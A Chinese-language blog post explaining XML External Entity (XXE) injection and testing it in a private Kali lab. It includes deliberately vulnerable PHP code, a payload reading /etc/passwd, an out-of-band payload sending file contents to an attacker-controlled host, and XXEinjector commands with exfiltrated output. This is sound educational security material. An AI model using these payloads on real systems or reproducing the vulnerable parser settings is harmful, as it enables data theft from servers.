# XXE漏洞的简单理解和测试

WEDNESDAY. NOVEMBER 16, 2016 - 5 MINS
XXE INJECTION

## 简介

XXE (XML External Entity Injection) 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。

那什么是 **实体(Entities)** 和 **外部实体(Externally Entities)**呢？

简单的理解，一个实体就是一个变量，可以在文档中的其他位置引用该变量。

实体主要分为四种：

内置实体 (Built-in entities)
字符实体 (Character entities)
通用实体 (General entities)
参数实体 (Parameter entities)
完整的介绍可以参考 DTD - Entities

首先实体的声明必须在 DTD 文件 或 <!DOCTYPE> 中，如

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
    <!ENTITY name "value">]>
<foo>
	<value>&name;</value> 
</foo>
```
中的

`<!ENTITY name "value">`

其中参数实体的引用是 是以 %name; 的格式来引用，其他实体则是 &name; 的格式，name 为实体名

只有在 DTD 文件中, 参数实体的声明才能够引用其他实体。

参数实体只能在 DTD 文件中被引用，其他实体在 XML 文档内引用。

内置实体为预留的实体，如：

实体引用	 字符

```
&lt;		<
&gt;		>
&amp;		&
&quot;		"
&apos;		'
```

字符实体 与 html 的实体编码类似，有十进制(&#97;)和十六进制(&#x61;)

此外，根据实体声明的方式不同，还分为内部实体和外部实体

因为 XXE 利用的是外部实体 这里主要说一下外部实体：

声明语法 / 例子 / 实体引用

```
<!ENTITY 实体名称 SYSTEM "URI/URL">

<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">

<author>&writer;</author>
```

这里的 URI/URL 可以是 http链接, file://本地文件引用 等，因此可以加载http指向的资源 和 本地文件。

在 XXE 攻击没有回显的情况下，可以利用参数实体来获取回显数据。

### 危害：

对于 XXE 的危害，主要有：

窃取敏感数据 (extracting sensitive data)
远程代码执行 (remote code execution)
对于 RCE 来说，需要安装并加载 PHP expect module, 比较少见

## 测试

这里按照 Attacking XML with XML External Entity Injection (XXE) 的教程在 kali 2 下进行测试

Victim IP: `192.168.1.28`

Attacker IP: `192.168.1.17`

存在xxe漏洞的php代码如下，加了一些注释

```
<?php
# Enable the ability to load external entities
libxml_disable_entity_loader (false);

$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();

# http://hublog.hubmed.org/archives/001854.html
# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); // this stuff is required to make sure

$creds = simplexml_import_dom($dom);
$user = $creds->user;
$pass = $creds->pass;

echo "You have logged in as user $user";
?>
```

在 `/var/www/html` 下创建 `xmlinject.php` 文件，启动apache

```
cd /var/www/html

vim xmlinject.php

service apache2 start
```

测试

```
POST http://192.168.1.28/xmlinject.php


<creds>
	<user>admin</user>
	<pass>mypass</pass>
</creds>
```

响应

`You have logged in as user admin`

使用外部实体来加载本地文件

```
POST http://192.168.1.28/xmlinject.php

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

这里声明了一个外部实体 `xxe`，值为 `file:///etc/passwd`，即本地 `/etc/passwd` 文件的内容

`<!ENTITY xxe SYSTEM "file:///etc/passwd" >`
然后在元素 user 内引用了该实体 &xxe;

`<user>&xxe;</user>`

请求响应

```
You have logged in as user root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
....
```

命令执行因为默认都没有装 expect module, 就不进行测试了

## 利用

在之前的例子中，结果被作为响应的一部分被返回了，但如果遇到没有回显的情况，就需要使用其他办法。

因为无法直接将要读取的文件内容发送到服务器，所以需要通过变量的方式，先把要读取的文件内容保存到变量中，然后通过 URL 引用外部实体的方式，在 URL 中引用该变量，让文件内容成为 URL 的一部分(如查询参数)，然后通过查看访问日志的方式来获取数据。

前面提到只有在 DTD 文件中声明 参数实体 时才可以引用其他参数实体，如

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
    <!ENTITY % param1 "Hello">
    <!ENTITY % param2 ",World">
    <!ENTITY % outter SYSTEM "other.dtd">
    %outter;
]>
```

`other.dtd` 文件内容为:

`<!ENTITY % name "%param1;%param2;">`

参数实体 name 引用了 参数实体 param1 和 param2，最后的值为 Hello,World

根据上面的分析，给出方法：

请求payload

```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://192.168.1.17:80/file.dtd">%remote;%int;%send;
]>
<foo></foo>
```

外部 DTD 文件 `http://192.168.1.17:80/file.dtd` 内容：

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % int "<!ENTITY &#37; send system 'http://192.168.1.17:80/?p=%file;'>">
```

因为实体的值中不能有 `%`, 所以将其转成html实体编码 \` %`

### 过程分析：

首先 `%remote`; 加载 外部 DTD 文件，得到：

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % int "<!ENTITY &#37; send system 'http://192.168.1.17:80/?p=%file;'>">

%int;%send;
```

接着 `%int;` 获取对应实体的值，因为值中包含实体引用 `%file;`, 即 `/etc/hosts` 文件的内容，得到:

```
<!ENTITY &#37; send system 'http://192.168.1.17:80/?p=[文件内容]'>

%send;
```

最后 `%send;` 获取对应实体的值，会去请求对应 URL 的资源，通过查看访问日志即可得到文件内容，当然这里还需要对内容进行编码，防止XML解析出错.

**以下内容参考了exploitation-xml-external-entity-xxe-injection 这篇文章 **

这里使用 XXEinjector 来进行无回显自动化获取文件。

首先修改之前的代码，去掉回显

```
<?php 
    libxml_disable_entity_loader (false); 
    $xmlfile = file_get_contents('php://input'); 
    $dom = new DOMDocument(); 
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    // $creds = simplexml_import_dom($dom); 
    // $user = $creds->user; 
    // $pass = $creds->pass; 
    // echo "You have logged in as user $user";
?> 
```

下载 XXEinjector

```
git clone https://github.com/enjoiz/XXEinjector.git

cd XXEinjector
```

使用 burp 获取原始正常的请求

`curl -d @xml.txt http://192.168.1.28/xmlinject.php --proxy http://127.0.0.1:8081`

xml.txt 内容

```
<creds>
    <user>Ed</user>
    <pass>mypass</pass>
</creds>
```

burp中获取到的请求信息

```
POST /xmlinject.php HTTP/1.1
Host: 192.168.1.28
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 57
Content-Type: application/x-www-form-urlencoded

<creds>
  <user>Ed</user>
  <pass>mypass</pass>
</creds>
```

在需要注入 DTD 的地方加入 XXEINJECT，然后保存到 phprequest.txt，XXEinjector 需要根据原始请求来进行获取文件内容的操作

```
POST /xmlinject.php HTTP/1.1
Host: 192.168.1.28
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 57
Content-Type: application/x-www-form-urlencoded

XXEINJECT
<creds>
  <user>Ed</user>
  <pass>mypass</pass>
</creds>
```

运行 XXEinjector

`sudo ruby XXEinjector.rb --host=192.168.1.17 --path=/etc/hosts --file=phprequest.txt  --proxy=127.0.0.1:8081 --oob=http --verbose --phpfilter`

参数说明

host: 用于反向连接的 IP
path: 要读取的文件或目录
file: 原始有效的请求信息，可以使用 XXEINJECT 来指出 DTD 要注入的位置
proxy: 代理服务器，这里使用burp，方便查看发起的请求和响应
oob：使用的协议，支持 http/ftp/gopher，这里使用http
phpfilter：使用 PHP filter 对要读取的内容进行 base64 编码，解决传输文件内容时的编码问题
运行后会输出 payload 和 引用的 DTD 文件

```
XXEinjector git:(master) sudo ruby XXEinjector.rb --host=192.168.1.17 --path=/etc/hosts --file=phprequest.txt  --proxy=127.0.0.1:8081 --oob=http --verbose --phpfilter
Password:
XXEinjector by Jakub Pałaczyński

DTD injected.
Enumeration locked.
Sending request with malicious XML:
http://192.168.1.28:80/xmlinject.php
{"User-Agent"=>"curl/7.43.0", "Accept"=>"*/*", "Content-Length"=>"159", "Content-Type"=>"application/x-www-form-urlencoded"}

<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://192.168.1.17:80/file.dtd">%remote;%int;%trick;]>
<creds>
  <user>Ed</user>
  <pass>mypass</pass>
</creds>

Got request for XML:
GET /file.dtd HTTP/1.0

Responding with XML for: /etc/hosts
XML payload sent:
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://192.168.1.17:80/?p=%payl;'>">
```

payload为

```
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://192.168.1.17:80/file.dtd">%remote;%int;%trick;]>
```

DTD文件为

```
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://192.168.1.17:80/?p=%payl;'>">
```

成功获取到文件

```
Response with file/directory content received:
GET /?p=MTI3LjAuMC4xCWxvY2FsaG9zdAoxMjcuMC4xLjEJa2FsaQoKIyBUaGUgZm9sbG93aW5nIGxpbmVzIGFyZSBkZXNpcmFibGUgZm9yIElQdjYgY2FwYWJsZSBob3N0cwo6OjEgICAgIGxvY2FsaG9zdCBpcDYtbG9jYWxob3N0IGlwNi1sb29wYmFjawpmZjAyOjoxIGlwNi1hbGxub2RlcwpmZjAyOjoyIGlwNi1hbGxyb3V0ZXJzCg== HTTP/1.0

Enumeration unlocked.
Successfully logged file: /etc/hosts
```

```
XXEinjector git:(master) cat Logs/192.168.1.28/etc/hosts.log
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```


在 kali 下拿 `/etc/passwd` 测试时，无法获取到，文件大小为 2.9K，base64后的长度为 `3924` 个字符

```
root@kali:/var/www/html# ls -lh /etc/passwd 
-rw-r--r-- 1 root root 2.9K Jan 20  2016 /etc/passwd
```

报错为：

```
root@kali:/var/www/html# tail -f /var/log/apache2/error.log  -n 0
[Wed Nov 16 04:45:23.548874 2016] [:error] [pid 1379] [client 192.168.1.17:57042] PHP Warning:  DOMDocument::loadXML(): Detected an entity reference loop in http://192.168.1.17:80/file.dtd, line: 2 in /var/www/html/xmlinject.php on line 5
[Wed Nov 16 04:45:23.549126 2016] [:error] [pid 1379] [client 192.168.1.17:57042] PHP Notice:  DOMDocument::loadXML(): PEReference: %int; not found in Entity, line: 1 in /var/www/html/xmlinject.php on line 5
[Wed Nov 16 04:45:23.549155 2016] [:error] [pid 1379] [client 192.168.1.17:57042] PHP Notice:  DOMDocument::loadXML(): PEReference: %trick; not found in Entity, line: 1 in /var/www/html/xmlinject.php on line 5
```

减少文件大小后，可以获取到，推测应该是 外部实体中的 URI 有长度限制导致无法获取到。

参考

exploitation-xml-external-entity-xxe-injection
Attacking XML with XML External Entity Injection (XXE)
XML实体攻击回顾
dtd_entities
php expect wrapper
b1ngz  b1ngz A Man who is finding the way home Tweet Share

Disqus seems to be taking longer than usual. Reload?

b1ngz © 2017 
Indigo theme by Kopplin